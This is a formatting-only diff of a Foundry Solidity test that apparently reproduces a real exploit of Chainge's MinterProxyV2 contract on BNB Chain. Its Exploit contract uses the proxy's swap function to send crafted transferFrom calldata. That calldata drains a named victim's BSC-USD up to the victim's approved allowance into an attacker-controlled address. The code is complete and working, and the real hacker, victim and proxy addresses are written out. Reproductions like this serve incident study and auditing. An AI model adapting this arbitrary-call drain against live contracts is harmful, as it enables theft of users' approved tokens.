@@ -18,6 +18,7 @@ import "forge-std/Test.sol";
 // Hacking God :
 
 interface IBEP20 {
+
     function totalSupply() external view returns (uint256);
     function decimals() external view returns (uint8);
     function symbol() external view returns (string memory);
@@ -31,9 +32,11 @@ interface IBEP20 {
 
     event Transfer(address indexed from, address indexed to, uint256 value);
     event Approval(address indexed owner, address indexed spender, uint256 value);
+
 }
 
 interface MinterProxyV2 {
+
     function swap(
         address tokenAddr,
         uint256 amount,
@@ -44,9 +47,11 @@ interface MinterProxyV2 {
         bytes calldata callData,
         bytes calldata order
     ) external payable;
+
 }
 
 contract Chainge is Test {
+
     address constant HACKER = 0x69795D09Aa99A305B4fC2eD158d4944bCd91D59A;
     address constant BSC_USD_ADDR = 0x55d398326f99059fF775485246999027B3197955;
 
@@ -61,7 +66,9 @@ contract Chainge is Test {
         uint256 balance;
         balance = IBEP20(BSC_USD_ADDR).balanceOf(HACKER);
         emit log_named_decimal_uint(
-            "Attacker balance of Binance-Peg BSC-USD (BSC-USD) before exploit is %s", balance, IBEP20(BSC_USD_ADDR).decimals()
+            "Attacker balance of Binance-Peg BSC-USD (BSC-USD) before exploit is %s",
+            balance,
+            IBEP20(BSC_USD_ADDR).decimals()
         );
         vm.startPrank(HACKER);
         Exploit exp = new Exploit();
@@ -70,12 +77,16 @@ contract Chainge is Test {
         balance = IBEP20(BSC_USD_ADDR).balanceOf(HACKER);
         // Log balances after exploit
         emit log_named_decimal_uint(
-            "Attacker balance of Binance-Peg BSC-USD (BSC-USD) after exploit is %s", balance, IBEP20(BSC_USD_ADDR).decimals()
+            "Attacker balance of Binance-Peg BSC-USD (BSC-USD) after exploit is %s",
+            balance,
+            IBEP20(BSC_USD_ADDR).decimals()
         );
     }
+
 }
 
 contract Exploit is Test {
+
     /* Constant Variable */
     address constant VICTIM = 0x8A4AA176007196D48d39C89402d3753c39AE64c1;
     address constant MINT_PROXY_V2 = 0x80a0D7A6FD2A22982Ce282933b384568E5c852bF;
@@ -98,7 +109,7 @@ contract Exploit is Test {
 
         uint256 BSC_USD_BALANCE = IBEP20(BSC_USD_ADDR).balanceOf(VICTIM);
         uint256 BSC_USD_ALLOWANCE = IBEP20(BSC_USD_ADDR).allowance(VICTIM, MINT_PROXY_V2);
-        amount = BSC_USD_BALANCE > BSC_USD_ALLOWANCE? BSC_USD_ALLOWANCE : BSC_USD_BALANCE;
+        amount = BSC_USD_BALANCE > BSC_USD_ALLOWANCE ? BSC_USD_ALLOWANCE : BSC_USD_BALANCE;
         data = abi.encodeWithSelector(0x23b872dd, VICTIM, owner, amount); // transferFrom function selector is 0x23b872dd
 
         MinterProxyV2(MINT_PROXY_V2).swap(
@@ -123,4 +134,5 @@ contract Exploit is Test {
     function transferFrom(address, address, uint256) external returns (bool) {
         return true;
     }
+
 }
